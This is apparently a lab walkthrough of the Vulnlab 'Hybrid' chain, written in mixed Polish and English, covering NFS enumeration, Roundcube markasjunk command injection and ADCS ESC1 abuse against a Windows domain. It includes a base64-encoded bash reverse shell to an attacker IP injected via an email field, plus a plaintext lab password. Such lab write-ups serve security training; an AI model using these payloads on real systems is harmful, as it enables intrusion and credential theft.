# Hybrid
Chains, Windows, Easy, created by **xct**

we start with two IPs
10.10.145.117
10.10.145.118

```
nmap -Pn -A -v -p- --version-all -oA nmap -T4 10.10.145.117 10.10.145.118
sudo nmap -sU -Pn -A -F -v -oA nmaUDP 10.10.145.117 10.10.145.118
```

```
Nmap scan report for 10.10.145.117
Host is up (0.032s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
593/tcp   open  ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap       Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-17T16:39:23
| Not valid after:  2025-07-17T16:39:23
| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a
|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9
3269/tcp  open  ssl/ldap   Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Issuer: commonName=hybrid-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-17T16:39:23
| Not valid after:  2025-07-17T16:39:23
| MD5:   4901:de71:cb50:f455:3fe3:23b1:2a87:0e2a
|_SHA-1: 74dc:f402:f306:04f6:c39f:fb8f:a1bf:f9f1:76e6:60a9
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49664/tcp open  msrpc      Microsoft Windows RPC
49669/tcp open  msrpc      Microsoft Windows RPC

53/udp  open  domain?
| fingerprint-strings: 
|   DNS-SD: 
|     _services
|     _dns-sd
|     _udp
|_    local
123/udp open  ntp?
| ntp-info: 
|_  receive time stamp: 2024-11-29T12:04:40

```

```
Nmap scan report for 10.10.145.118
Host is up (0.030s latency).
Not shown: 65378 closed tcp ports (conn-refused), 142 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Redirecting...
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL STLS TOP CAPA UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37519/tcp   mountd
|   100005  1,2,3      45205/tcp6  mountd
|   100005  1,2,3      46112/udp6  mountd
|   100005  1,2,3      57093/udp   mountd
|   100021  1,3,4      34607/tcp6  nlockmgr
|   100021  1,3,4      44401/tcp   nlockmgr
|   100021  1,3,4      55605/udp   nlockmgr
|   100021  1,3,4      59039/udp6  nlockmgr
|   100024  1          33233/tcp   status
|   100024  1          33629/tcp6  status
|   100024  1          42276/udp6  status
|   100024  1          56743/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more listed LOGINDISABLEDA0001 LITERAL+ Pre-login post-login STARTTLS capabilities IMAP4rev1 OK ENABLE SASL-IR have ID IDLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
587/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more listed AUTH=LOGINA0001 LITERAL+ OK post-login IDLE capabilities IMAP4rev1 Pre-login AUTH=PLAIN SASL-IR have ID ENABLE LOGIN-REFERRALS
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
995/tcp   open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Issuer: commonName=mail01
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-17T13:20:17
| Not valid after:  2033-06-14T13:20:17
| MD5:   3837:2b81:2fb1:6f03:4360:25b4:d26b:db29
|_SHA-1: 61c2:4002:71ff:7850:e0da:4a5a:e256:e7df:666b:b008
|_pop3-capabilities: SASL(PLAIN LOGIN) USER TOP CAPA UIDL RESP-CODES PIPELINING AUTH-RESP-CODE
2049/tcp  open  nfs_acl  3 (RPC #100227)
33097/tcp open  mountd   1-3 (RPC #100005)
33233/tcp open  status   1 (RPC #100024)
37519/tcp open  mountd   1-3 (RPC #100005)
44401/tcp open  nlockmgr 1-4 (RPC #100021)
56547/tcp open  mountd   1-3 (RPC #100005)


9/udp     open|filtered discard
19/udp    open|filtered chargen
68/udp    open|filtered dhcpc
80/udp    open|filtered http
111/udp   open          rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      37519/tcp   mountd
|   100005  1,2,3      57093/udp   mountd
|   100021  1,3,4      44401/tcp   nlockmgr
|   100021  1,3,4      55605/udp   nlockmgr
|   100024  1          33233/tcp   status
|   100024  1          56743/udp   status
|_  100227  3           2049/tcp   nfs_acl
139/udp   open|filtered netbios-ssn
158/udp   open|filtered pcmail-srv
161/udp   open|filtered snmp
515/udp   open|filtered printer
626/udp   open|filtered serialnumberd
1023/udp  open|filtered unknown
1030/udp  open|filtered iad1
1646/udp  open|filtered radacct
2049/udp  open|filtered nfs
2223/udp  open|filtered rockwell-csp2
5060/udp  open|filtered sip
49152/udp open|filtered unknown
49193/udp open|filtered unknown
49201/udp open|filtered unknown

```

/etc/hosts
```
10.10.145.117 dc01.hybrid.vl 
10.10.145.118 mail01.hybrid.vl
```

 prosty chłopak jestem, widzę 2049 to puszczam showmounta.

 ![{7D7366BC-1FFD-4D4A-A707-3C0CDBEBA037}](https://github.com/user-attachments/assets/3199867f-294d-490c-9926-6438f576e948)

![{A957F612-5DD5-472B-80E4-DCB2669F9855}](https://github.com/user-attachments/assets/49d509d1-5889-41a6-ba7f-7202ca36f006)

```
 2067  cp /mnt/x/backup.tar.gz .
 2068  7z x backup.tar.gz
 2069  7z x backup.tar
```

```
ls -la opt/certs/hybrid.vl/
ls -la etc
```

![{F13EB37F-2B04-408F-AC0C-4220B23AC264}](https://github.com/user-attachments/assets/f085b1f6-1512-4326-b7f2-6dba28ffb656)

![{333BCFCC-DBFF-4350-B460-F4DA1E720198}](https://github.com/user-attachments/assets/633d0c29-39b0-4041-9add-4bebf9fa9dd4)

![{6641D9B1-0624-4FE5-8296-EAC00DABDE99}](https://github.com/user-attachments/assets/66dbac24-dd38-4a75-a12b-e1b7875bcf00)

```
vmail:x:5000:5000:virtual mail user:/var/mail/vhosts:/bin/sh

```
o ciekawe

```
cat etc/dovecot/dovecot-users
```
to dało nam username:password dwóch userów

```
admin@hybrid.vl:{plain}Du<coś tam. Zrób leniu>21
peter.turner@hybrid.vl:{plain}P<coś tam. Zrób leniu>l!
```

![{00951F59-0D33-4BB1-AB09-85A0E7765859}](https://github.com/user-attachments/assets/df640b81-f75e-4004-913e-fa22eecf7b17)

jako admin

![{EE0461A6-9F0F-403C-A120-0E32C46DFED8}](https://github.com/user-attachments/assets/3931c5f3-3727-458a-83b4-dd9776ab3393)


jako peter

![{4CD72901-5B2B-4D1C-8A4D-5A14319ED191}](https://github.com/user-attachments/assets/966d5489-d493-4eae-b19c-21c8b56a285d)

w sumie.. nic więcej

`https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/`

![{F1C8EBA2-D11C-468D-9E59-7CC967B9B99D}](https://github.com/user-attachments/assets/6f1aeb45-6f7c-4bcd-b1e4-61f4fb2f38ad)

```
echo "bash -c '/bin/bash -i >& /dev/tcp/10.8.4.124/9001 0>&1'" | base64
```

```
&echo${IFS}YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguNC4xMjQvOTAwMSAwPiYxJwo=|base64${IFS}-d|bash&@hybrid.vl
```

jakikolwiek mail do `junk`

![{EFD7636F-8158-463A-948D-9EA976623E52}](https://github.com/user-attachments/assets/fc94d885-2233-42be-8b52-07f93f4df703)

![{020A3500-15E1-4C94-9960-ECC6847E4694}](https://github.com/user-attachments/assets/14d9a9db-a4aa-4166-91e8-430cd5db10cd)

![{1DCB7A0E-F911-4F61-995D-9868AEEDC120}](https://github.com/user-attachments/assets/04ddb1eb-ede5-48c5-83d8-8ba2e90e0053)

- credsy `peter.turner@hybrid.vl` nie działają :/

![{FFBCEE09-BEB5-45ED-8953-156EC7F49C37}](https://github.com/user-attachments/assets/a070cee9-e148-4ea4-9a5e-689498d33786)

![{19E02589-3DDA-4544-82C5-984D3A826069}](https://github.com/user-attachments/assets/08d5320e-4f96-4002-bf1e-58dbde0f1a96)

hmmmm. Może coś z tym sharem się uda

![{3E44E07D-892E-40DC-BEA9-D10C1E07F43C}](https://github.com/user-attachments/assets/91198b8b-82cf-4070-87f8-37111d8cd85e)

![{12D6FF8B-8DEE-4F30-BDC4-F1248B10562B}](https://github.com/user-attachments/assets/f770141a-79ce-459a-8887-b4a515e8211b)

nie da się jako root, ale pewnie da się jako ten peter. Tylko znaleźć jego uid

![{F9DD5D0C-8628-4675-8F2E-6FBF41AE03FC}](https://github.com/user-attachments/assets/326a1e29-946a-4a91-a31d-02c484e490ef)

![{AC7651F0-E0F9-4A0F-A3D0-391D09CD058C}](https://github.com/user-attachments/assets/ae851849-3725-43dd-b129-d9ad81e3f9b6)

ajajaja trzeba zmienić.

![{FB1DAE7C-CAE9-47E9-A70E-86974EA0B70F}](https://github.com/user-attachments/assets/edf10b25-713c-4b8f-ad1c-19bc22a7ff54)

![{07AD332D-F894-469D-9E0C-07A12070D63A}](https://github.com/user-attachments/assets/b97dc9d4-031b-410b-a114-dc87d31651ae)

![{1CDDC298-8B33-4A8B-908C-17CBDB4B4BB9}](https://github.com/user-attachments/assets/65eff009-c267-408b-a133-fe355ccfab21)

![{D5908FCD-61FA-4DCE-9B17-701DB56D0CBE}](https://github.com/user-attachments/assets/8276057c-dfaa-4a45-9d49-98caf2230899)

echhhhhhhhh

I need downlaod bash from machine and change SUID

![{CF7622C6-CA90-4479-8915-8C5C0E430842}](https://github.com/user-attachments/assets/22206f3a-1f30-4ba6-9bfa-1f716765bbe2)

![{88E020C6-E1C8-40FF-8500-0B110EC4184A}](https://github.com/user-attachments/assets/e9f358d9-ba9d-47d4-bd0f-7e22ef39c8ae)

![{588AA037-8F72-4062-B85B-71EAF86305DE}](https://github.com/user-attachments/assets/000d94ec-a1fa-4a55-aec3-5b527f75d68c)

nice!!

![{577662D3-5F30-4BD9-9D2B-0932CA1E65E1}](https://github.com/user-attachments/assets/448185f6-be87-4749-90cc-2c25bc9438e0)

We send "send the file without sending"

```
cat passwords.kdbx | base64 -w0
```

![{FE9191E1-E789-428B-9708-2CC741760436}](https://github.com/user-attachments/assets/1edfd828-f02e-40e6-98dc-b55c49b6025e)

I weasted to much time for cracking..
IT was password reuse from 

- zacięła mi się vmka i mi się odechciało xd

![{1FCF5B94-9444-420B-89AA-666E160C7161}](https://github.com/user-attachments/assets/13c5f7b3-eaf5-43b1-ab5f-92b34830d185)

Peter password works.

![{6D4F3EDF-504D-496B-A2F0-B7BCBF6BF37C}](https://github.com/user-attachments/assets/e3f0e288-ec66-411c-957b-9b0f61262b33)

this password is new one.

![{7E30585A-5A4D-4860-9F85-89474EF115D4}](https://github.com/user-attachments/assets/aea30518-6bc0-47a4-95d6-8200833d552c)

this password works for `peter.turner@hybrid.vl`

nie dość, że mamy flagę to od razu roota na tym komputerze

![{EE992B07-4440-486E-953E-3709B1183D7F}](https://github.com/user-attachments/assets/7bc47895-c7f7-4209-8267-aad33cb38d56)

(ta flaga juz była jednak. Nowa flaga jest w /root)

mamy już usera w domenie to zróbmy jakiegoś bloodhounda
```
bloodhound-python -d 'hybrid.vl' -u 'peter.turner' -p 'b<sam dasz radę>w' -gc 'dc01.hybrid.vl' -ns 10.10.161.181
```
- w sumie nic nie ma, ale z tego za zauważyłem to vulnlab lubie mocno ADCS abuse'ować więc to pewnie tam jest rozwiązanie.
```
└─$ certipy-ad  find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -vulnerable -stdout -dc-ip 10.10.161.181
```

widzimy ESC1
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'hybrid-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'hybrid-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'hybrid-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'hybrid-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : hybrid-DC01-CA
    DNS Name                            : dc01.hybrid.vl
    Certificate Subject                 : CN=hybrid-DC01-CA, DC=hybrid, DC=vl
    Certificate Serial Number           : 2C6A3009FBCF12B64DEDF517B3C6624F
    Certificate Validity Start          : 2023-06-17 14:04:39+00:00
    Certificate Validity End            : 2124-12-02 15:07:27+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : HYBRID.VL\Administrators
      Access Rights
        ManageCertificates              : HYBRID.VL\Administrators
                                          HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        ManageCa                        : HYBRID.VL\Administrators
                                          HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
        Enroll                          : HYBRID.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : HybridComputers
    Display Name                        : HybridComputers
    Certificate Authorities             : hybrid-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : HYBRID.VL\Administrator
        Write Owner Principals          : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Dacl Principals           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Property Principals       : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

no to w ESC1 potrzeba hasha maszynowego więc zapewne musimy dorwać ten z MAIL01$.

pobieramy 2 rzeczy. Jedną z maszyny i drugą z internetów.
```
wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py
wget -q 10.10.161.182:9999/krb5.keytab
```
krb5.keytab location is `/etc/krb5.keytab`

![{8614DC16-2759-4409-B171-FE44AD7B7C57}](https://github.com/user-attachments/assets/7dad943c-0ad9-49be-8598-b00688dc00f9)

jedyen czego nam brakuje to nazwa templatki, której nie widzę tutaj. Jednakże są pewne sztuczki, żeby ją zdobyć.
```
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.161.181 -old-bloodhound
```

![{42048413-34FB-48BC-ACCA-27AE125FC6DE}](https://github.com/user-attachments/assets/fd9becae-4285-4fe6-9411-483c7daaa53e)

![{95BD6017-CF0D-46C5-98E2-A1FED716D9F1}](https://github.com/user-attachments/assets/b6a8c154-3189-44e8-9093-23ce68fcce7f)

były znowu problemy z długością klucza, ale jeden switch i śmiga.

![{523C331F-6BA1-46F4-A4CF-024525E42B27}](https://github.com/user-attachments/assets/b0fdd2ff-db8d-457e-8dae-b01c56fc6ecc)

i no końcówka

![{EB031930-1BB2-45B6-838C-294AECB8D29E}](https://github.com/user-attachments/assets/958ae462-da55-47f8-b1b5-d6b147945641)

FINISH
